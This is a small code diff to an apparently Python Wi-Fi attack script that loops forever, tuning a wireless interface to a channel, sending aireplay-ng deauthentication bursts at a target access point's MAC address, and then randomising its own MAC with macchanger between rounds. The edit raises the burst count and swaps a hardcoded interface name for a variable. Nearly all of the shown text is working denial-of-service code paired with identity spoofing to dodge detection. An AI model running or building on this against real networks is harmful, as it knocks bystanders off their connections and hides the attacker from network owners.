@@ -21,7 +21,7 @@ sleep(3)
 while True:
     try:
         os.system(f"iw dev {interface} set channel {canal}")
-        os.system(f"aireplay-ng --deauth 5 -a {MAC} wlan0 | grep 'DeAuth'")
+        os.system(f"aireplay-ng --deauth 10 -a {MAC} {interface} | grep 'DeAuth'")
         os.system(f"ip link set {interface} down")
         os.system(f"macchanger -r {interface} | grep 'New MAC' ")
         os.system(f"ip link set {interface} up")
